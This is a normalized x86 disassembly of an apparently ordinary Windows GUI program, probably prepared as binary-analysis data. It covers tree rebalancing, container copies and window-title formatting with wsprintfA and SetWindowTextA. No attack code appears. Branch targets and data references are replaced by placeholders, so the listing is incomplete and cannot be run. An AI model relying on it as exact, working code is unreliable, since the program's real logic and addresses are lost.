call sub_40afa0
mov eax [ esi + 0x8 ]
mov edx [ edi + 0x4 ]
mov eax [ edx + 0x4 ]
mov ebp esi
cmp ebp eax
mov esi [ esi + 0x4 ]
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x2c ] bl
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x2c ] bl
jne r-xdata
jmp r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x2c ] bl
jne r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x2c ] bl
jne r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x2c ] bl
jne r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x2c ] bl
je r-xdata
mov cl [ esi + 0x2c ]
mov [ eax + 0x2c ] cl
mov [ esi + 0x2c ] bl
mov edx [ eax ]
push esi
mov ecx edi
mov [ edx + 0x2c ] bl
call sub_40b000
mov edx [ eax + 0x8 ]
mov [ edx + 0x2c ] bl
push eax
mov ecx edi
mov [ eax + 0x2c ] 0x0
call sub_40afa0
mov eax [ esi ]
mov [ eax + 0x2c ] 0x0
mov cl [ esi + 0x2c ]
mov [ eax + 0x2c ] cl
mov [ esi + 0x2c ] bl
mov edx [ eax + 0x8 ]
push esi
mov ecx edi
mov [ edx + 0x2c ] bl
call sub_40afa0
jmp r-xdata
mov edx [ eax ]
mov [ edx + 0x2c ] bl
push eax
mov ecx edi
mov [ eax + 0x2c ] 0x0
call sub_40b000
mov eax [ esi + 0x8 ]
sub_4659a0
push 0xffffffff
push sub_4c0d08
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x4c
push esi
push edi
mov edi [ esp + 0x68 ]
mov al [ edi + 0x15 ]
test al al
mov [ esp + 0x8 ] ecx
je r-xdata
push ebx
mov ebx edi
push ebp
lea ecx [ esp + 0x70 ]
mov [ esp + 0x14 ] ebx
call sub_45db10
mov ebp [ edi ]
mov al [ ebp + 0x15 ]
test al al
lea eax [ edi + 0x8 ]
jne r-xdata
xor esi esi
mov eax r--data
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] esi
mov [ esp + 0x14 ] 0x0
lea edx [ eax + 0x1 ]
mov ebp [ eax ]
mov edx [ eax ]
mov cl [ edx + 0x15 ]
test cl cl
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x18 ]
call sub_401e80
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x30 ]
mov [ esp + 0x60 ] esi
call sub_402340
push r--data
lea ecx [ esp + 0x30 ]
push ecx
mov [ esp + 0x34 ] r--data
call sub_4b5bd2
mov ecx [ ebx ]
mov [ ecx + 0x4 ] edi
mov edx [ ebx ]
mov [ edi ] edx
cmp edi [ ebx + 0x8 ]
jne r-xdata
mov al [ ebp + 0x15 ]
test al al
mov esi [ ebx + 0x4 ]
jne r-xdata
cmp edi ebx
jne r-xdata
mov eax [ esp + 0x70 ]
mov edi eax
add eax 0x8
mov cl [ ebp + 0x15 ]
test cl cl
mov esi [ edi + 0x4 ]
jne r-xdata
mov esi edi
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ ebp + 0x4 ] esi
mov [ esi ] ebp
mov ecx [ ebx + 0x8 ]
mov [ eax ] ecx
mov edx [ ebx + 0x8 ]
mov [ edx + 0x4 ] edi
mov [ ebp + 0x4 ] esi
mov eax [ esp + 0x10 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] ebp
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi + 0x8 ] ebp
mov [ esi ] ebp
jmp r-xdata
mov edi [ ecx + 0x4 ]
cmp [ edi ] ebx
jne r-xdata
mov [ eax + 0x8 ] edi
mov [ eax ] edi
jmp r-xdata
mov ecx [ ebx + 0x4 ]
mov [ edi + 0x4 ] ecx
mov dl [ ebx + 0x14 ]
mov al [ edi + 0x14 ]
mov [ edi + 0x14 ] dl
mov [ ebx + 0x14 ] al
mov edi [ ecx + 0x4 ]
cmp [ edi + 0x8 ] ebx
jne r-xdata
mov al [ ebp + 0x15 ]
test al al
je r-xdata
mov eax [ esp + 0x14 ]
push eax
call j_sub_4b66ed#2
mov eax [ edi + 0x8 ]
add esp 0x4
test eax eax
pop ebp
pop ebx
jbe r-xdata
mov ecx [ edi + 0x4 ]
cmp ebp [ ecx + 0x4 ]
je r-xdata
mov eax [ esp + 0x14 ]
mov cl [ eax + 0x14 ]
mov edi [ esp + 0x10 ]
mov bl 0x1
cmp cl bl
jne r-xdata
mov al [ ebp + 0x15 ]
test al al
je r-xdata
push ebp
call sub_45daf0
mov ecx [ esp + 0x14 ]
add esp 0x4
mov eax esi
jmp r-xdata
mov ecx [ esp + 0x68 ]
mov eax [ esp + 0x64 ]
mov [ eax ] ecx
mov ecx [ esp + 0x54 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x58
retn 0x8
dec eax
mov [ edi + 0x8 ] eax
mov [ ebp + 0x14 ] bl
cmp [ ebp + 0x14 ] bl
jne r-xdata
push ebp
call sub_45da70
add esp 0x4
mov [ edi + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ edi + 0x8 ] eax
jmp r-xdata
mov [ edi ] eax
mov eax [ esi ]
cmp ebp eax
jne r-xdata
mov cl [ eax + 0x14 ]
test cl cl
jne r-xdata
mov eax [ esi + 0x8 ]
mov cl [ eax + 0x14 ]
test cl cl
jne r-xdata
mov cl [ eax + 0x15 ]
test cl cl
jne r-xdata
mov [ eax + 0x14 ] bl
push esi
mov ecx edi
mov [ esi + 0x14 ] 0x0
call sub_45da90
mov eax [ esi ]
mov cl [ eax + 0x15 ]
test cl cl
jne r-xdata
mov [ eax + 0x14 ] bl
push esi
mov ecx edi
mov [ esi + 0x14 ] 0x0
call sub_45da10
mov eax [ esi + 0x8 ]
mov edx [ edi + 0x4 ]
mov eax [ edx + 0x4 ]
mov ebp esi
cmp ebp eax
mov esi [ esi + 0x4 ]
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x14 ] bl
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x14 ] bl
jne r-xdata
jmp r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x14 ] bl
jne r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x14 ] bl
jne r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x14 ] bl
jne r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x14 ] bl
je r-xdata
mov cl [ esi + 0x14 ]
mov [ eax + 0x14 ] cl
mov [ esi + 0x14 ] bl
mov edx [ eax ]
push esi
mov ecx edi
mov [ edx + 0x14 ] bl
call sub_45da90
mov edx [ eax + 0x8 ]
mov [ edx + 0x14 ] bl
push eax
mov ecx edi
mov [ eax + 0x14 ] 0x0
call sub_45da10
mov eax [ esi ]
mov [ eax + 0x14 ] 0x0
mov cl [ esi + 0x14 ]
mov [ eax + 0x14 ] cl
mov [ esi + 0x14 ] bl
mov edx [ eax + 0x8 ]
push esi
mov ecx edi
mov [ edx + 0x14 ] bl
call sub_45da10
jmp r-xdata
mov edx [ eax ]
mov [ edx + 0x14 ] bl
push eax
mov ecx edi
mov [ eax + 0x14 ] 0x0
call sub_45da90
mov eax [ esi + 0x8 ]
sub_465c70
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
mov al [ edi + 0x2d ]
test al al
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_465c70
mov esi [ esi ]
mov ecx edi
call sub_4480b0
push edi
call j_sub_4b66ed#2
mov al [ esi + 0x2d ]
add esp 0x4
test al al
mov edi esi
je r-xdata
sub_465cb0
push ebp
mov ebp [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
cmp esi ebp
je r-xdata
pop esi
pop ebp
retn
push ebx
push edi
mov edi [ esp + 0x1c ]
lea ebx [ edi + 0x4 ]
mov eax [ edi ]
push 0xffffffff
push 0x0
push ebx
lea ecx [ esi + 0x4 ]
mov [ esi ] eax
call sub_401dd0
add esi 0x20
cmp esi ebp
jne r-xdata
pop edi
pop ebx
sub_465cf0
mov eax [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push esi
mov esi [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
mov eax esp
mov [ eax ] ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x1c ]
mov [ eax ] edx
mov eax esp
push esi
mov [ eax ] ecx
call sub_462dd0
add esp 0x14
mov eax esi
pop esi
retn
sub_465d30
mov eax [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
cmp esi eax
je r-xdata
pop esi
retn
push ebx
push ebp
mov ebp [ esp + 0x18 ]
push edi
mov ebx [ esi ]
test ebx ebx
je r-xdata
inc [ edi + 0xd48 ]
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ esi + 0x8 ]
mov [ esi ] edi
call sub_402540
mov eax [ ebp + 0x78 ]
mov [ esi + 0x78 ] eax
mov eax [ esp + 0x18 ]
add esi 0x80
cmp esi eax
jne r-xdata
dec [ ebx + 0xd48 ]
jne r-xdata
mov edi [ ebp ]
test edi edi
je r-xdata
pop edi
pop ebp
pop ebx
mov ecx ebx
call sub_43fe30
push ebx
call j_sub_4b66ed#2
add esp 0x4
sub_465da0
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
cmp esi ebx
je r-xdata
mov eax [ esp + 0x14 ]
pop esi
pop ebx
retn
push edi
mov edi [ esp + 0x18 ]
push esi
mov ecx edi
call sub_402540
add esi 0x70
add edi 0x70
cmp esi ebx
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_465de0
mov eax [ esp + 0x8 ]
push edi
mov edi [ esp + 0x8 ]
cmp edi eax
je r-xdata
mov eax [ esp + 0x10 ]
pop edi
retn
push ebx
push ebp
push esi
mov esi [ esp + 0x1c ]
mov ebp [ esi ]
test ebp ebp
je r-xdata
inc [ ebx + 0xd48 ]
lea eax [ edi + 0x8 ]
push eax
lea ecx [ esi + 0x8 ]
mov [ esi ] ebx
call sub_402540
mov ecx [ edi + 0x78 ]
mov eax [ esp + 0x18 ]
mov [ esi + 0x78 ] ecx
add edi 0x80
add esi 0x80
cmp edi eax
jne r-xdata
dec [ ebp + 0xd48 ]
jne r-xdata
mov ebx [ edi ]
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebp
pop ebx
pop edi
retn
mov ecx ebp
call sub_43fe30
push ebp
call j_sub_4b66ed#2
add esp 0x4
sub_465e60
mov eax [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
cmp eax edi
je r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x14 ]
mov [ eax ] edx
pop edi
retn
push ebx
push ebp
push esi
mov esi [ esp + 0x20 ]
jmp r-xdata
mov ebx [ edi - 0x80 ]
sub edi 0x80
sub esi 0x80
test ebx ebx
je r-xdata
mov ebp [ esi ]
test ebp ebp
je r-xdata
inc [ ebx + 0xd48 ]
lea eax [ edi + 0x8 ]
push eax
lea ecx [ esi + 0x8 ]
mov [ esi ] ebx
call sub_402540
cmp edi [ esp + 0x18 ]
mov ecx [ edi + 0x78 ]
mov [ esi + 0x78 ] ecx
jne r-xdata
dec [ ebp + 0xd48 ]
jne r-xdata
mov eax [ esp + 0x14 ]
mov [ eax ] esi
pop esi
pop ebp
pop ebx
pop edi
retn
mov ecx ebp
call sub_43fe30
push ebp
call j_sub_4b66ed#2
add esp 0x4
sub_465ef0
push ebp
mov ebp esp
push 0xffffffff
push sub_4c0ad1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
nop
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp + 0x8 ] esi
cmp esi ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
add esi 0x70
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x10 ] esi
add edi 0x70
jmp r-xdata
push edi
mov ecx esi
call sub_402400
cmp edi [ ebp + 0xc ]
je r-xdata
sub_465f4a
mov edi [ ebp - 0x14 ]
mov eax [ ebp + 0x10 ]
xor ebx ebx
cmp edi eax
je r-xdata
push ebx
push ebx
call sub_4b5bd2
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
lea esi [ edi + 0x6c ]
lea esp [ esp ]
mov [ esi ] 0xf
mov [ esi - 0x4 ] ebx
mov [ esi - 0x14 ] bl
cmp [ esi - 0x54 ] 0x10
jb r-xdata
mov eax [ esi - 0x14 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax [ ebp + 0x10 ]
mov [ esi - 0x54 ] 0xf
mov [ esi - 0x58 ] ebx
mov [ esi - 0x68 ] bl
add edi 0x70
add esi 0x70
cmp edi eax
jne r-xdata
mov eax [ esi - 0x68 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp [ esi ] 0x10
jb r-xdata
sub_465fd0
push ebp
mov ebp esp
push 0xffffffff
push sub_4c0af1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
nop
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp + 0x8 ] esi
cmp esi ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
add esi 0x20
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x10 ] esi
add edi 0x20
jmp r-xdata
mov eax [ edi ]
push 0xffffffff
lea ecx [ esi + 0x4 ]
mov [ esi ] eax
push ebx
lea edx [ edi + 0x4 ]
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] ebx
push edx
mov [ ecx + 0x4 ] bl
call sub_401dd0
cmp edi [ ebp + 0xc ]
je r-xdata
sub_46603e
mov edi [ ebp - 0x14 ]
mov eax [ ebp + 0x10 ]
xor ebx ebx
cmp edi eax
je r-xdata
push ebx
push ebx
call sub_4b5bd2
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
lea esi [ edi + 0x1c ]
lea ecx [ ecx ]
mov eax [ ebp + 0x10 ]
mov [ esi ] 0xf
mov [ esi - 0x4 ] ebx
mov [ esi - 0x14 ] bl
add edi 0x20
add esi 0x20
cmp edi eax
jne r-xdata
mov eax [ esi - 0x14 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp [ esi ] 0x10
jb r-xdata
sub_4660a0
push ebp
mov ebp esp
push 0xffffffff
push sub_4c0b19
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
nop
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp + 0x8 ] esi
cmp esi ebx
je r-xdata
add esi 0x80
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x10 ] esi
add edi 0x80
jmp r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
cmp edi [ ebp + 0xc ]
je r-xdata
mov [ esi ] eax
lea eax [ edi + 0x8 ]
push eax
lea ecx [ esi + 0x8 ]
mov [ ebp - 0x4 ] 0x2
call sub_402400
mov ecx [ edi + 0x78 ]
mov [ esi + 0x78 ] ecx
inc [ eax + 0xd48 ]
sub_466114
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x10 ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_4b5bd2
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov edi edi
mov ecx esi
call sub_460f30
add esi 0x80
cmp esi edi
jne r-xdata
sub_466150
push 0xffffffff
push sub_4c0b7d
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x398
mov eax [ rw-data ]
push ebx
push esi
push 0xffffffeb
push eax
call [ GetWindowLongA@IAT ]
xor ebx ebx
mov esi eax
mov [ esp + 0xc ] esi
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] ebx
mov [ esp + 0x14 ] bl
mov eax [ esi + 0x124 ]
cmp eax ebx
mov [ esp + 0x3a8 ] ebx
jle r-xdata
mov ecx [ esp + 0x3a0 ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x3a4
retn
cmp [ rw-data ] ebx
push ebp
push edi
mov edi [ wsprintfA@IAT ]
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
push eax
lea ecx [ esp + 0xac ]
push r--data
push ecx
call edi
add esp 0xc
mov edx [ esi + 0x124 ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
push edx
inc eax
push eax
inc ecx
push ecx
lea edx [ esp + 0xb4 ]
push r--data
push edx
call edi
add esp 0x14
cmp [ rw-data ] ebx
je r-xdata
fld [ rw-data ]
push ecx
fmul [ r--data ]
fstp [ esp ]
call sub_452500
push eax
lea ecx [ esp + 0x2b0 ]
push r--data
push ecx
call edi
mov eax [ rw-data ]
add esp 0x10
cmp eax 0x5
jne r-xdata
lea eax [ esp + 0x2a8 ]
push r--data
push eax
call edi
add esp 0x8
jmp r-xdata
mov edx [ esi + 0x124 ]
mov eax [ rw-data ]
push edx
inc eax
push eax
lea ecx [ esp + 0xb0 ]
push r--data
push ecx
call edi
add esp 0x10
jmp r-xdata
cmp [ rw-data ] ebx
jle r-xdata
cmp [ rw-data ] ebx
mov ebp [ rw-data ]
mov [ esp + 0x10 ] ebx
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
mov [ esp + 0x1a8 ] 0x0
jle r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov edx [ esi + 0x124 ]
mov eax [ rw-data ]
push edx
inc eax
push eax
lea ecx [ esp + 0xb0 ]
push r--data
push ecx
call edi
add esp 0x10
jmp r-xdata
mov esi [ rw-data ]
test esi esi
jl r-xdata
mov edi [ esi + 0x3c ]
cmp edi ebx
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
jle r-xdata
push eax
push r--data
lea edx [ esp + 0x1b0 ]
push edx
jmp r-xdata
mov edi [ esp + 0x14 ]
test ebp ebp
jne r-xdata
cmp [ esi + 0x40 ] 0x10
jb r-xdata
mov eax [ rw-data ]
cmp eax ebx
jle r-xdata
push eax
push r--data
lea eax [ esp + 0x1b0 ]
push eax
jmp r-xdata
call edi
add esp 0xc
mov ebp [ esp + 0x14 ]
cmp [ rw-data ] 0x2
jne r-xdata
mov ecx [ rw-data ]
sub ecx ebp
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
add esi 0x2c
mov [ esp + 0x10 ] esi
jmp r-xdata
mov ecx [ esi + 0x2c ]
mov [ esp + 0x10 ] ecx
jmp r-xdata
lea edx [ esp + 0x1a8 ]
push edx
lea eax [ esp + 0x2ac ]
push eax
call [ lstrcatA@IAT ]
push eax
push r--data
lea ecx [ esp + 0x1b0 ]
push ecx
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea ecx [ ecx ]
mov ecx [ esp + 0x14 ]
mov eax [ ecx + 0xac ]
test eax eax
je r-xdata
imul esi esi 0x70
mov ecx [ esi + ebp + 0x18 ]
cmp ecx 0x10
lea eax [ esi + ebp ]
jb r-xdata
cmp esi edx
jge r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
sub eax edx
push eax
lea ecx [ esp + 0xac ]
push ecx
lea ecx [ esp + 0x20 ]
call sub_401e80
mov eax r--data
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ esp + 0xac ]
push eax
lea ecx [ esp + 0x20 ]
call sub_401e80
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov esi [ rw-data ]
test esi esi
jl r-xdata
cmp [ ecx + 0xb0 ] 0x10
jb r-xdata
mov edi [ eax + 0x14 ]
lea edx [ eax + 0x4 ]
mov [ esp + 0x10 ] edx
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edi [ eax + 0x14 ]
mov [ esp + 0x10 ] ecx
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x20 ]
call sub_401cc0
cmp [ rw-data ] 0xffffffff
je r-xdata
cmp eax 0x1
jne r-xdata
mov esi [ esp + 0x10 ]
push esi
call sub_457f90
add esp 0x4
sub edi eax
push edi
add eax esi
push eax
lea ecx [ esp + 0x3c ]
call sub_401e80
test ebx ebx
je r-xdata
mov ecx rw-data
call sub_4010f0
cmp esi eax
jge r-xdata
lea ebx [ ecx + 0x9c ]
mov ebp eax
jmp r-xdata
mov ebx [ ecx + 0x9c ]
mov ebp eax
jmp r-xdata
push r--data
lea edx [ esp + 0x1c ]
push edx
lea eax [ esp + 0x74 ]
push eax
call sub_402140
lea ecx [ esp + 0x2b4 ]
push ecx
push eax
lea edx [ esp + 0xa0 ]
push edx
mov [ esp + 0x3c8 ] 0x5
call sub_402140
add esp 0x18
push 0xffffffff
xor ebx ebx
push ebx
push eax
lea ecx [ esp + 0x24 ]
mov [ esp + 0x3bc ] 0x6
call sub_401dd0
mov eax [ esp + 0xa4 ]
mov edi 0x10
cmp eax edi
jb r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push ebx
call sub_457f90
add esp 0x4
sub ebp eax
push ebp
add eax ebx
push eax
jmp r-xdata
imul esi esi 0x70
mov ecx [ esi + ebp + 0x18 ]
cmp ecx 0x10
lea eax [ esi + ebp ]
jb r-xdata
xor ecx ecx
mov eax 0xf
mov [ esp + 0x4c ] eax
mov [ esp + 0x48 ] ecx
mov [ esp + 0x38 ] cl
mov [ esp + 0x68 ] eax
mov [ esp + 0x64 ] ecx
mov [ esp + 0x54 ] cl
cmp [ esp + 0x10 ] ecx
lea eax [ esp + 0xa8 ]
mov [ esp + 0x3b0 ] 0x2
lea edx [ eax + 0x1 ]
je r-xdata
cmp [ esp + 0x84 ] edi
mov ebp 0xf
mov [ esp + 0xa4 ] ebp
mov [ esp + 0xa0 ] ebx
mov [ esp + 0x90 ] 0x0
mov [ esp + 0x3b0 ] 0x2
jb r-xdata
mov eax [ esp + 0x90 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
push r--data
lea ecx [ esp + 0x1c ]
call sub_402010
push r--data
lea ecx [ esp + 0x1c ]
call sub_402010
push 0xffffffff
push 0x0
lea eax [ esp + 0x3c ]
push eax
lea ecx [ esp + 0x24 ]
call sub_4018c0
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
xor esi esi
jmp r-xdata
lea ecx [ esp + 0x58 ]
call sub_401e80
mov ebp [ eax + 0x14 ]
lea ebx [ eax + 0x4 ]
jmp r-xdata
mov ebx [ eax + 0x4 ]
mov ebp [ eax + 0x14 ]
jmp r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x70 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov eax [ rw-data ]
test eax eax
je r-xdata
lea ecx [ esp + 0x50 ]
push ecx
lea edx [ esp + 0x70 ]
push r--data
push edx
call sub_40c3c0
add esp 0xc
push 0xffffffff
push 0x0
push eax
lea ecx [ esp + 0x24 ]
mov [ esp + 0x3bc ] 0x4
call sub_4018c0
lea ecx [ esp + 0x6c ]
mov [ esp + 0x3b0 ] 0x2
call sub_4480e0
push 0xffffffff
push 0x0
lea edx [ esp + 0x3c ]
push edx
lea ecx [ esp + 0x24 ]
call sub_4018c0
jmp r-xdata
push r--data
lea eax [ esp + 0x54 ]
push eax
lea ecx [ esp + 0x74 ]
push ecx
call sub_402140
add esp 0xc
push 0xffffffff
push 0x0
push eax
lea ecx [ esp + 0x24 ]
mov [ esp + 0x3bc ] 0x3
call sub_4018c0
lea ecx [ esp + 0x6c ]
mov [ esp + 0x3b0 ] 0x2
call sub_4480e0
lea esi [ eax + 0x1 ]
mov esi [ rw-data ]
inc esi
jmp r-xdata
mov ecx [ esp + 0x10 ]
sub edi esi
lea edx [ esi + ecx ]
push edi
push edx
lea ecx [ esp + 0x3c ]
call sub_401e80
test ebx ebx
je r-xdata
cmp [ rw-data ] ebx
jbe r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x88 ] edx
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub ebp esi
push ebp
add esi ebx
push esi
mov eax [ rw-data ]
mov ecx [ rw-data ]
cmp ecx eax
mov eax [ esp + 0x30 ]
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
mov eax [ rw-data ]
test eax eax
jne r-xdata
cmp eax edi
mov eax [ esp + 0x1c ]
jae r-xdata
cmp eax edi
mov eax [ esp + 0x1c ]
jae r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov eax r--data
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x20 ]
call sub_401cc0
cmp [ rw-data ] ebx
je r-xdata
mov eax [ rw-data ]
fld [ eax * 4 + rw-data ]
push ecx
fmul [ r--data ]
fstp [ esp ]
call sub_452500
push eax
lea ecx [ esp + 0x1b0 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
add esp 0x10
lea edx [ esp + 0x1a8 ]
push edx
lea eax [ esp + 0x2ac ]
push eax
call [ lstrcatA@IAT ]
jmp r-xdata
push eax
push ecx
lea eax [ esp + 0x1c ]
mov edx [ rw-data ]
push eax
push edx
jmp r-xdata
lea eax [ esp + 0x1c ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
jmp r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax + 0x120 ] edi
jb r-xdata
mov esi [ esp + 0x10 ]
cmp esi ebx
je r-xdata
cmp [ esp + 0x4c ] edi
mov [ esp + 0x68 ] ebp
mov [ esp + 0x64 ] ebx
mov [ esp + 0x54 ] 0x0
jb r-xdata
mov eax [ esp + 0x54 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
call [ SetWindowTextA@IAT ]
call sub_435d10
cmp [ esp + 0x68 ] edi
jb r-xdata
lea ecx [ esp + 0x20 ]
call sub_401cc0
lea esi [ eax + 0x10c ]
mov esi [ eax + 0x10c ]
jmp r-xdata
push 0xffffffff
push ebx
lea ecx [ esp + 0x3c ]
push ecx
lea ecx [ esp + 0x24 ]
call sub_4018c0
jmp r-xdata
push esi
call sub_457f90
add esp 0x4
push eax
push esi
lea ecx [ esp + 0x3c ]
call sub_401e80
cmp [ esp + 0x30 ] edi
pop edi
mov [ esp + 0x48 ] ebp
mov [ esp + 0x44 ] ebx
mov [ esp + 0x34 ] 0x0
pop ebp
jb r-xdata
mov ecx [ esp + 0x38 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
add eax 0x10c
mov eax [ eax + 0x10c ]
jmp r-xdata
cmp [ eax + 0x120 ] edi
jb r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
mov edx [ esp + 0x14 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
push ecx
push eax
lea ecx [ esp + 0x20 ]
call sub_401cc0
push eax
call sub_457f40
add esp 0x4
add eax esi
mov ecx eax
lea esi [ ecx + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x20 ]
call sub_401cc0
sub_466930
sub esp 0x48
mov eax [ rw-data ]
push ebx
push ebp
push esi
push edi
push 0xfffffff0
push eax
call [ GetWindowLongA@IAT ]
mov edx [ rw-data ]
lea ecx [ esp + 0x2c ]
push ecx
push edx
mov edi eax
call [ GetClientRect@IAT ]
mov esi [ GetSystemMetrics@IAT ]
push 0x2
call esi
push 0x3
mov ebp eax
